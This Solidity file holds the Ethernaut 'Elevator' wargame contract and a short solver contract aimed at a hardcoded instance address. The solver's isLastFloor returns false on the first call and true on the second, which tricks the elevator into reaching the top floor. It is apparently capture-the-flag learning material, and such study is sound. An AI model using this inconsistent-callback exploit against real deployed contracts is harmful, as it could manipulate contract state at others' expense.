// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title Elevator
/// @author OpenZeppelin
/// @notice Reach the top of the building
///         

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract AttackBuilding{
    Elevator public elevator = Elevator(0x52D615C78d9d066e121b7CA03179e05E2AE8ad27);
    bool public flipBool;

  function attack() public {
    elevator.goTo(1);
  }

  function isLastFloor(uint) public returns (bool){
    if(!flipBool){
      flipBool = true;
      return false;
    }else{
      flipBool = false;
      return true;
    }
  }
}